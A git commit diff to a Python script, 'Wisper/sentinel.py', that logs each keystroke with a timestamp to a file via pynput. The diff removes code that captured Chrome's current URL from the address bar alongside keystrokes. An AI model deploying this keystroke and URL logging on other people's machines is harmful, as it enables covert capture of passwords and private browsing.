71ba18d7e564a80d7033658a2a142b53b1af66b8
Zhengy827 <37745451+Zhengy827@users.noreply.github.com>
2018-03-25 09:24:11 -0400

    removed extra parts

--- Wisper/sentinel.py
+++ Wisper/sentinel.py
@@ -1,25 +1,15 @@
 from pynput import keyboard
 import os
 import time
-import uiautomation as automation
-import psutil, win32process, win32gui
-
-def active_window_process_name():
-    pid = win32process.GetWindowThreadProcessId(win32gui.GetForegroundWindow())
-    return psutil.Process(pid[-1]).name()
-
 
 def on_press(key):
     try:
         d = time.strftime("%Y/%m/%d,%H:%M:%S")
-        url = ''
-        if active_window_process_name() == 'chrome.exe':
-            url = ',' + get_current_url()
-        log.append(key.char + ',' + d + url + '\n')
+        log.append(key.char + ',' + d + '\n')
     except AttributeError:
         d = time.strftime("%Y/%m/%d,%H:%M:%S")
         if key == keyboard.Key.space:
-            log.append(' ' + ',' + d + url + '\n')
+            log.append(' ' + ',' + d + '\n')
     if key == keyboard.Key.esc:
         # Stop listener
         raise keyboard.Listener.StopException
@@ -36,22 +26,9 @@ def start_wisper():
         for key in log:
             filek.write(str(key))
 
-def get_current_url():
-    control = automation.GetFocusedControl()
-    controlList = []
-    while control:
-        controlList.insert(0, control)
-        control = control.GetParentControl()
-    if len(controlList) == 1:
-        control = controlList[0]
-    else:
-        control = controlList[1]
-    address_control = automation.FindControl(control, lambda c, d: isinstance(c, automation.EditControl) and "Address and search bar" in c.Name)
-    return str(address_control.CurrentValue())
 
 if __name__ == "__main__":
     try:
         start_wisper()
     except:
         filek.close()
-
